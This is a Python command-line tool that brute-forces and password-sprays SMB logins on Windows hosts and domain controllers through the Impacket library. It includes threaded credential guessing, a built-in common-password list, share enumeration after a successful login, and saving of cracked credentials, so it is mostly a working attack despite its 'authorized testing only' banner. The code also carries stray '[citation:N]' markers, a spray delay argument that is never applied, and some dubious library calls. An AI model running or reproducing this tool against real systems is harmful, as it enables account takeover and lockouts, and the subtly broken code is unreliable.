#!/usr/bin/env python3
"""
SMB Brute Force Tool with Impacket
A comprehensive utility for testing SMB server security through controlled
brute force attacks using the Impacket library. Supports multiple authentication
types, domain authentication, and intelligent attack patterns.
"""

import argparse
import sys
import os
import threading
import queue
import time
import logging
import socket
from datetime import datetime
from typing import List, Tuple, Optional, Dict, Union
from concurrent.futures import ThreadPoolExecutor, as_completed

# Try importing impacket with fallback message
try:
    from impacket.smbconnection import SMBConnection
    from impacket.smb import SMB_DIALECT
    from impacket.ntlm import NTLMAuthChallenge
    from impacket import smb, smb3
    from impacket.smb3 import SMB3_DIALECT_002, SMB3_DIALECT_021, SMB3_DIALECT_0300
    from impacket.nt_errors import STATUS_SUCCESS, STATUS_LOGON_FAILURE, STATUS_ACCOUNT_LOCKED_OUT
    from impacket import version
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()  # Initialize colorama for Windows support
except ImportError:
    COLORAMA_AVAILABLE = False

class SMBBruteForcer:
    """
    Main class for SMB brute force operations using Impacket
    Handles connection testing, credential validation, and multi-threaded attacks
    """
    
    # Common SMB ports
    SMB_PORTS = [445, 139]
    
    # SMB dialects supported
    SMB_DIALECTS = {
        'SMB1': 'NT LM 0.12',
        'SMB2': 'SMB 2.002',
        'SMB2.1': 'SMB 2.1',
        'SMB3': 'SMB 3.0'
    }
    
    # Impacket-specific SMB connection parameters [citation:6]
    SMB_CONNECTION_FLAGS = {
        'SMB1': 0x00000000,
        'SMB2': 0x00000001,
        'SMB3': 0x00000002
    }
    
    def __init__(self, target: str, port: int = 445, domain: Optional[str] = None,
                 timeout: int = 10, verbose: bool = False, smb_version: str = 'SMB2',
                 use_kerberos: bool = False):
        """
        Initialize SMB brute forcer with Impacket
        
        Args:
            target: Target IP or hostname
            port: SMB port (default: 445)
            domain: Domain for authentication (for domain-joined systems)
            timeout: Connection timeout in seconds
            verbose: Enable verbose output
            smb_version: Preferred SMB dialect (SMB1, SMB2, SMB3)
            use_kerberos: Use Kerberos authentication instead of NTLM [citation:2]
        """
        if not IMPACKET_AVAILABLE:
            raise ImportError(
                "impacket module is required. Install with: pip install impacket"
            )
        
        self.target = target
        self.port = port
        self.domain = domain
        self.timeout = timeout
        self.verbose = verbose
        self.smb_version = smb_version
        self.use_kerberos = use_kerberos
        
        # Statistics and state
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'connection_errors': 0,
            'account_locked': 0,
            'start_time': None
        }
        
        # Setup logging
        self.setup_logging()
        
        # Validate target
        self.validate_target()
        
        # Get SMB info
        self.get_smb_info()
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('SMBBruteForcer')
        
        # Remove existing handlers
        self.logger.handlers.clear()
        
        # Create console handler
        handler = logging.StreamHandler()
        
        # Set format based on colorama availability
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        # Set log level
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def validate_target(self):
        """Validate target is reachable and SMB port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result != 0:
                self.logger.warning(
                    f"Target {self.target}:{self.port} appears unreachable. "
                    "Connection may fail."
                )
            else:
                self.logger.info(f"Target {self.target}:{self.port} is reachable")
                
        except Exception as e:
            self.logger.error(f"Target validation failed: {e}")
    
    def get_smb_info(self) -> Dict:
        """
        Retrieve SMB server information using Impacket
        
        Returns:
            Dictionary with SMB server information
        """
        info = {
            'os': None,
            'domain': None,
            'dialects': [],
            'signing_required': False
        }
        
        try:
            # Try anonymous connection to get server info
            conn = SMBConnection(self.target, self.target, timeout=self.timeout)
            
            # Get server OS info
            info['os'] = conn.getServerOS()
            info['domain'] = conn.getServerDomain()
            
            # Check if SMB signing is required [citation:2]
            try:
                # Attempt to list shares to test signing
                conn.listShares()
            except Exception as e:
                if 'STATUS_ACCESS_DENIED' in str(e):
                    # Need credentials to list shares
                    pass
                elif 'STATUS_INVALID_SIGNATURE' in str(e):
                    info['signing_required'] = True
            
            conn.logoff()
            
            self.logger.info(f"SMB Server OS: {info['os']}")
            self.logger.info(f"SMB Domain: {info['domain']}")
            if info['signing_required']:
                self.logger.warning("SMB signing is required")
            
        except Exception as e:
            self.logger.debug(f"Could not retrieve full SMB info: {e}")
        
        return info
    
    def test_credentials_impacket(self, username: str, password: str, 
                                   domain: Optional[str] = None) -> Tuple[bool, Optional[str], Optional[Dict]]:
        """
        Test SMB credentials using Impacket's SMBConnection
        
        Args:
            username: Username to test
            password: Password to test
            domain: Domain for authentication (overrides instance domain)
        
        Returns:
            Tuple of (success, error_message, share_list)
        """
        conn = None
        try:
            # Use provided domain or instance domain
            auth_domain = domain or self.domain or ''
            
            # Format username with domain if needed
            if auth_domain and '\\' not in username and '@' not in username:
                full_username = f"{auth_domain}\\{username}"
            else:
                full_username = username
            
            # Create SMB connection with specified dialect [citation:6]
            if self.smb_version == 'SMB1':
                conn = SMBConnection(self.target, self.target, timeout=self.timeout)
                conn.setDialect(SMB_DIALECT)
            elif self.smb_version == 'SMB3':
                conn = SMBConnection(self.target, self.target, timeout=self.timeout)
                # Try to negotiate SMB3
                try:
                    conn.setDialect(SMB3_DIALECT_0300)
                except:
                    conn.setDialect(SMB3_DIALECT_021)
            else:  # SMB2 default
                conn = SMBConnection(self.target, self.target, timeout=self.timeout)
            
            # Attempt login
            if self.use_kerberos:
                # Kerberos authentication [citation:2]
                conn.kerberosLogin(
                    username,
                    password,
                    domain=auth_domain,
                    useCache=False
                )
            else:
                # NTLM authentication
                conn.login(username, password, auth_domain)
            
            # Success! Now try to list shares
            shares = []
            try:
                shares = conn.listShares()
                share_names = [share['shi1_netname'][:-1] for share in shares 
                              if 'shi1_netname' in share]
            except Exception as e:
                self.logger.debug(f"Could not list shares: {e}")
                share_names = []
            
            conn.logoff()
            
            return True, None, {'shares': share_names, 'server_os': conn.getServerOS()}
            
        except Exception as e:
            error_str = str(e)
            
            # Parse Impacket-specific errors
            if 'STATUS_LOGON_FAILURE' in error_str:
                return False, "Invalid credentials", None
            elif 'STATUS_ACCOUNT_LOCKED_OUT' in error_str:
                with self.lock:
                    self.stats['account_locked'] += 1
                return False, "Account locked out", None
            elif 'STATUS_ACCOUNT_DISABLED' in error_str:
                return False, "Account disabled", None
            elif 'STATUS_PASSWORD_EXPIRED' in error_str:
                return False, "Password expired", None
            elif 'STATUS_ACCOUNT_EXPIRED' in error_str:
                return False, "Account expired", None
            elif 'STATUS_ACCESS_DENIED' in error_str:
                return False, "Access denied", None
            elif 'STATUS_INVALID_SIGNATURE' in error_str:
                return False, "SMB signing required", None
            elif 'STATUS_NETWORK_SESSION_EXPIRED' in error_str:
                return False, "Session expired", None
            elif 'STATUS_CONNECTION_DISCONNECTED' in error_str:
                with self.lock:
                    self.stats['connection_errors'] += 1
                return False, "Connection disconnected", None
            else:
                return False, f"SMB error: {error_str}", None
                
        finally:
            if conn:
                try:
                    conn.logoff()
                except:
                    pass
    
    def enumerate_shares(self, username: str, password: str, 
                         domain: Optional[str] = None) -> List[str]:
        """
        Enumerate SMB shares with valid credentials
        
        Args:
            username: Valid username
            password: Valid password
            domain: Domain for authentication
        
        Returns:
            List of share names
        """
        success, error, info = self.test_credentials_impacket(username, password, domain)
        
        if success and info and 'shares' in info:
            return info['shares']
        
        return []
    
    def check_null_session(self) -> bool:
        """
        Check if null session (anonymous login) is allowed
        
        Returns:
            True if null session allowed
        """
        try:
            success, error, info = self.test_credentials_impacket('', '')
            if success:
                self.logger.warning("[!] Null session allowed! This is a security risk")
                return True
        except:
            pass
        
        return False
    
    def worker(self, task_queue: queue.Queue, results_queue: queue.Queue):
        """
        Worker thread for processing credential attempts
        
        Args:
            task_queue: Queue with (username, password) tuples
            results_queue: Queue for successful results
        """
        while not self.stop_event.is_set():
            try:
                username, password = task_queue.get(timeout=1)
            except queue.Empty:
                break
            
            # Test credentials
            success, error, info = self.test_credentials_impacket(username, password)
            
            # Update statistics
            with self.lock:
                self.stats['attempts'] += 1
                if success:
                    self.stats['successes'] += 1
                    result = {
                        'username': username,
                        'password': password,
                        'domain': self.domain,
                        'timestamp': datetime.now().isoformat(),
                        'target': f"{self.target}:{self.port}",
                        'shares': info.get('shares', []) if info else [],
                        'server_os': info.get('server_os', 'Unknown') if info else 'Unknown'
                    }
                    self.found_credentials.append(result)
                    results_queue.put(result)
                    
                    # Log success with colors
                    if COLORAMA_AVAILABLE:
                        self.logger.info(
                            f"{Fore.GREEN}[+] SUCCESS: {username}:{password}{Style.RESET_ALL}"
                        )
                        if info and info.get('shares'):
                            self.logger.info(
                                f"{Fore.GREEN}    Available shares: {', '.join(info['shares'][:5])}{Style.RESET_ALL}"
                            )
                    else:
                        self.logger.info(f"[+] SUCCESS: {username}:{password}")
                        if info and info.get('shares'):
                            self.logger.info(f"    Available shares: {', '.join(info['shares'][:5])}")
                else:
                    self.stats['failures'] += 1
                    
                    # Log failures in verbose mode
                    if self.verbose and error:
                        if 'locked' in error.lower():
                            if COLORAMA_AVAILABLE:
                                self.logger.debug(
                                    f"{Fore.YELLOW}[!] Account locked: {username}{Style.RESET_ALL}"
                                )
                            else:
                                self.logger.debug(f"[!] Account locked: {username}")
                        elif self.verbose:
                            if COLORAMA_AVAILABLE:
                                self.logger.debug(
                                    f"{Fore.RED}[-] Failed: {username}:{password} - {error}{Style.RESET_ALL}"
                                )
                            else:
                                self.logger.debug(f"[-] Failed: {username}:{password} - {error}")
            
            task_queue.task_done()
            
            # Small delay to prevent overwhelming the server
            time.sleep(0.1)
    
    def brute_force(self, usernames: List[str], passwords: List[str],
                   threads: int = 5, max_attempts: Optional[int] = None,
                   stop_on_success: bool = True) -> List[Dict]:
        """
        Perform brute force attack
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to test
            threads: Number of concurrent threads
            max_attempts: Maximum number of attempts
            stop_on_success: Stop when first credential is found
        
        Returns:
            List of found credentials
        """
        self.logger.info(f"[*] Starting SMB brute force attack")
        self.logger.info(f"[*] Target: {self.target}:{self.port}")
        self.logger.info(f"[*] Domain: {self.domain if self.domain else 'None'}")
        self.logger.info(f"[*] SMB Version: {self.smb_version}")
        self.logger.info(f"[*] Authentication: {'Kerberos' if self.use_kerberos else 'NTLM'}")
        self.logger.info(f"[*] Usernames: {len(usernames)}")
        self.logger.info(f"[*] Passwords: {len(passwords)}")
        self.logger.info(f"[*] Total combinations: {len(usernames) * len(passwords):,}")
        self.logger.info(f"[*] Threads: {threads}")
        
        # Check null session first
        if self.check_null_session():
            self.logger.warning("[!] Null session works - consider fixing this security issue")
        
        # Create task queue
        task_queue = queue.Queue()
        results_queue = queue.Queue()
        
        # Populate task queue
        attempt_count = 0
        for username in usernames:
            for password in passwords:
                task_queue.put((username, password))
                attempt_count += 1
                if max_attempts and attempt_count >= max_attempts:
                    break
            if max_attempts and attempt_count >= max_attempts:
                break
        
        total_attempts = attempt_count
        self.stats['start_time'] = time.time()
        
        # Start worker threads
        thread_list = []
        for _ in range(min(threads, total_attempts)):
            t = threading.Thread(
                target=self.worker,
                args=(task_queue, results_queue),
                daemon=True
            )
            t.start()
            thread_list.append(t)
        
        # Monitor progress
        last_attempts = 0
        try:
            while any(t.is_alive() for t in thread_list) and not self.stop_event.is_set():
                time.sleep(2)
                
                # Check for results
                while not results_queue.empty():
                    result = results_queue.get()
                    if stop_on_success:
                        self.logger.info("[*] Stopping attack - credentials found")
                        self.stop_event.set()
                        return self.found_credentials
                
                # Update progress
                current_attempts = self.stats['attempts']
                if current_attempts > last_attempts:
                    elapsed = time.time() - self.stats['start_time']
                    rate = current_attempts / elapsed if elapsed > 0 else 0
                    percent = (current_attempts / total_attempts) * 100
                    
                    if COLORAMA_AVAILABLE:
                        self.logger.info(
                            f"{Fore.CYAN}[*] Progress: {current_attempts:,}/{total_attempts:,} "
                            f"({percent:.1f}%) | Rate: {rate:.1f}/s | "
                            f"Found: {len(self.found_credentials)} | "
                            f"Locked: {self.stats['account_locked']}{Style.RESET_ALL}"
                        )
                    else:
                        self.logger.info(
                            f"[*] Progress: {current_attempts:,}/{total_attempts:,} "
                            f"({percent:.1f}%) | Rate: {rate:.1f}/s | "
                            f"Found: {len(self.found_credentials)} | "
                            f"Locked: {self.stats['account_locked']}"
                        )
                    
                    last_attempts = current_attempts
                
        except KeyboardInterrupt:
            self.logger.info("[!] Interrupted by user")
            self.stop_event.set()
        
        # Wait for threads to finish
        for t in thread_list:
            t.join(timeout=2)
        
        # Final statistics
        elapsed = time.time() - self.stats['start_time']
        self.logger.info(f"[*] Attack completed in {elapsed:.2f} seconds")
        self.logger.info(f"[*] Total attempts: {self.stats['attempts']:,}")
        self.logger.info(f"[*] Successful: {len(self.found_credentials)}")
        self.logger.info(f"[*] Account lockouts: {self.stats['account_locked']}")
        
        return self.found_credentials
    
    def password_spray(self, usernames: List[str], password: str,
                      threads: int = 3, delay: float = 2) -> List[Dict]:
        """
        Perform password spraying attack (one password, many users)
        Uses fewer threads and longer delays to avoid lockouts [citation:10]
        
        Args:
            usernames: List of usernames to test
            password: Single password to try
            threads: Number of threads (lower for password spray)
            delay: Delay between attempts in seconds
        
        Returns:
            List of found credentials
        """
        self.logger.info(f"[*] Starting password spray with password: {password}")
        self.logger.info(f"[*] Testing {len(usernames)} users")
        self.logger.info(f"[*] Delay between attempts: {delay}s")
        
        # Override for password spray - slower and more careful
        return self.brute_force(
            usernames=usernames,
            passwords=[password],
            threads=threads,
            stop_on_success=False  # Don't stop after first success
        )
    
    def domain_brute_force(self, usernames: List[str], passwords: List[str],
                          domain_controller: bool = False) -> List[Dict]:
        """
        Brute force specifically for domain authentication
        
        Args:
            usernames: List of usernames
            passwords: List of passwords
            domain_controller: Target is a domain controller
        
        Returns:
            List of found credentials
        """
        if domain_controller:
            self.logger.info("[*] Target is a Domain Controller - extra caution advised")
        
        return self.brute_force(usernames, passwords)
    
    def load_wordlist(self, wordlist_file: str) -> List[str]:
        """
        Load words from a file
        
        Args:
            wordlist_file: Path to wordlist file
        
        Returns:
            List of words
        """
        words = []
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            self.logger.info(f"[+] Loaded {len(words)} entries from {wordlist_file}")
        except FileNotFoundError:
            self.logger.error(f"[-] File not found: {wordlist_file}")
        except Exception as e:
            self.logger.error(f"[-] Error loading wordlist: {e}")
        
        return words
    
    def generate_common_credentials(self) -> Tuple[List[str], List[str]]:
        """
        Generate common SMB usernames and passwords
        
        Returns:
            Tuple of (usernames list, passwords list)
        """
        common_usernames = [
            'administrator', 'admin', 'guest', 'user', 'backup',
            'service', 'svc', 'sql', 'mysql', 'oracle', 'tomcat',
            'jenkins', 'git', 'ftp', 'www', 'web', 'test', 'demo',
            'root', 'ubuntu', 'centos', 'debian', 'vagrant'
        ]
        
        common_passwords = [
            'password', '123456', 'Password1', 'P@ssw0rd', 'admin',
            'Administrator1', 'Welcome1', 'Password123', 'root',
            'toor', 'changeme', 'qwerty', 'abc123', 'letmein',
            'monkey', 'dragon', 'master', 'hello', 'freedom',
            'whatever', 'trustno1', 'passw0rd', 'admin123'
        ]
        
        return common_usernames, common_passwords
    
    def save_results(self, output_file: str):
        """
        Save found credentials to file
        
        Args:
            output_file: Output file path
        """
        if not self.found_credentials:
            self.logger.info("[-] No credentials to save")
            return
        
        try:
            with open(output_file, 'w') as f:
                f.write("SMB Brute Force Results\n")
                f.write("=" * 50 + "\n")
                f.write(f"Target: {self.target}:{self.port}\n")
                f.write(f"Domain: {self.domain if self.domain else 'None'}\n")
                f.write(f"Date: {datetime.now().isoformat()}\n")
                f.write(f"Total attempts: {self.stats['attempts']:,}\n")
                f.write("=" * 50 + "\n\n")
                
                for cred in self.found_credentials:
                    f.write(f"Username: {cred['username']}\n")
                    f.write(f"Password: {cred['password']}\n")
                    f.write(f"Domain: {cred.get('domain', 'None')}\n")
                    f.write(f"Server OS: {cred.get('server_os', 'Unknown')}\n")
                    f.write(f"Timestamp: {cred['timestamp']}\n")
                    if cred.get('shares'):
                        f.write(f"Available shares: {', '.join(cred['shares'])}\n")
                    f.write("-" * 30 + "\n")
            
            self.logger.info(f"[+] Results saved to: {output_file}")
            
        except Exception as e:
            self.logger.error(f"[-] Failed to save results: {e}")

def parse_list_input(input_str: str) -> List[str]:
    """
    Parse input string that could be a file or comma-separated list
    
    Args:
        input_str: File path or comma-separated list
    
    Returns:
        List of items
    """
    items = []
    
    # Check if input is a file
    if os.path.isfile(input_str):
        with open(input_str, 'r', encoding='utf-8', errors='ignore') as f:
            items = [line.strip() for line in f if line.strip()]
    else:
        # Comma-separated list
        items = [item.strip() for item in input_str.split(',') if item.strip()]
    
    return items

def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    SMB Brute Force Tool with Impacket
    For authorized security testing only
    Supports NTLM, Kerberos, and Domain Authentication
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.CYAN}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)

def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='SMB Brute Force Tool - Test SMB server authentication security using Impacket',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Standard brute force with wordlists
  python smb_bruteforce.py 192.168.1.100 -U users.txt -P passwords.txt
  
  # Domain authentication
  python smb_bruteforce.py 192.168.1.100 -U users.txt -P passwords.txt --domain EXAMPLE
  
  # Password spray attack
  python smb_bruteforce.py 192.168.1.100 -U users.txt --spray "Summer2024!" --delay 3
  
  # SMB1 support for legacy systems
  python smb_bruteforce.py 192.168.1.100 -U users.txt -P passwords.txt --smb-version SMB1
  
  # Kerberos authentication
  python smb_bruteforce.py 192.168.1.100 -U users.txt -P passwords.txt --kerberos --domain EXAMPLE
  
  # Null session check
  python smb_bruteforce.py 192.168.1.100 --null-session
  
  # Common credentials attack
  python smb_bruteforce.py 192.168.1.100 --common
  
  # Domain controller attack
  python smb_bruteforce.py 192.168.1.100 -U users.txt -P passwords.txt --domain EXAMPLE --dc
        """
    )
    
    # Target arguments
    parser.add_argument('target', help='Target IP address or hostname')
    parser.add_argument('--port', '-p', type=int, default=445,
                       help='SMB port (default: 445, alternative: 139)')
    parser.add_argument('--domain', '-d', help='Domain for authentication')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Connection timeout in seconds (default: 10)')
    
    # SMB options
    parser.add_argument('--smb-version', choices=['SMB1', 'SMB2', 'SMB3'], default='SMB2',
                       help='SMB dialect version (default: SMB2)')
    parser.add_argument('--kerberos', action='store_true',
                       help='Use Kerberos authentication instead of NTLM [citation:2]')
    
    # Credential arguments
    user_group = parser.add_mutually_exclusive_group()
    user_group.add_argument('-u', '--username', help='Single username')
    user_group.add_argument('-U', '--usernames', help='Usernames file or comma-separated list')
    
    pass_group = parser.add_mutually_exclusive_group()
    pass_group.add_argument('-P', '--passwords', help='Passwords file or comma-separated list')
    pass_group.add_argument('--spray', help='Password spray attack with single password')
    
    # Special options
    parser.add_argument('--null-session', action='store_true',
                       help='Check for null session (anonymous access)')
    parser.add_argument('--common', action='store_true',
                       help='Use common SMB credentials')
    parser.add_argument('--dc', action='store_true',
                       help='Target is a Domain Controller (extra caution)')
    
    # Attack options
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads (default: 5)')
    parser.add_argument('--delay', type=float, default=0,
                       help='Delay between attempts in seconds')
    parser.add_argument('--max-attempts', type=int,
                       help='Maximum number of attempts')
    parser.add_argument('--no-stop', action='store_true',
                       help='Continue after finding credentials')
    
    # Output options
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if impacket is available
    if not IMPACKET_AVAILABLE:
        print("[!] impacket module is required. Install with: pip install impacket")
        print("    On Kali: sudo apt install impacket-scripts [citation:1]")
        sys.exit(1)
    
    try:
        # Initialize brute forcer
        forcer = SMBBruteForcer(
            target=args.target,
            port=args.port,
            domain=args.domain,
            timeout=args.timeout,
            verbose=args.verbose,
            smb_version=args.smb_version,
            use_kerberos=args.kerberos
        )
        
        # Check null session
        if args.null_session:
            print("\n[*] Testing null session...")
            if forcer.check_null_session():
                print("[!] WARNING: Null session allowed! This is a security risk")
            else:
                print("[*] Null session not allowed")
            
            if not args.usernames and not args.username:
                sys.exit(0)
        
        # Prepare usernames
        usernames = []
        if args.username:
            usernames = [args.username]
        elif args.usernames:
            usernames = parse_list_input(args.usernames)
        elif args.common:
            usernames, _ = forcer.generate_common_credentials()
        elif not args.null_session:
            print("[-] Username(s) required. Use -u, -U, or --common")
            sys.exit(1)
        
        # Prepare passwords
        passwords = []
        if args.spray:
            passwords = [args.spray]
        elif args.passwords:
            passwords = parse_list_input(args.passwords)
        elif args.common:
            _, passwords = forcer.generate_common_credentials()
        elif not args.null_session:
            print("[-] Password(s) required. Use -P, --spray, or --common")
            sys.exit(1)
        
        # Perform attack
        found = []
        
        if args.spray and usernames:
            # Password spray mode
            print(f"\n[*] Password spray mode")
            print(f"[*] Password: {args.spray}")
            print(f"[*] Username list: {len(usernames)} entries\n")
            
            found = forcer.password_spray(
                usernames=usernames,
                password=args.spray,
                threads=args.threads,
                delay=args.delay
            )
            
        elif usernames and passwords:
            # Standard or domain brute force
            if args.dc:
                print(f"\n[*] Domain Controller attack mode")
                found = forcer.domain_brute_force(
                    usernames=usernames,
                    passwords=passwords,
                    domain_controller=True
                )
            else:
                print(f"\n[*] Standard brute force mode")
                print(f"[*] Usernames: {len(usernames)}")
                print(f"[*] Passwords: {len(passwords)}")
                print(f"[*] Total combinations: {len(usernames) * len(passwords):,}\n")
                
                found = forcer.brute_force(
                    usernames=usernames,
                    passwords=passwords,
                    threads=args.threads,
                    max_attempts=args.max_attempts,
                    stop_on_success=not args.no_stop
                )
        
        # Save results if requested
        if args.output and found:
            forcer.save_results(args.output)
        
        # Display summary
        if found:
            print(f"\n{'='*60}")
            print(f"[+] SUCCESS! Found {len(found)} credential(s):")
            for cred in found:
                print(f"    {cred['username']}:{cred['password']}")
                if cred.get('shares'):
                    print(f"        Shares: {', '.join(cred['shares'][:3])}")
            print(f"{'='*60}\n")
        elif not args.null_session:
            print(f"\n[-] No valid credentials found\n")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
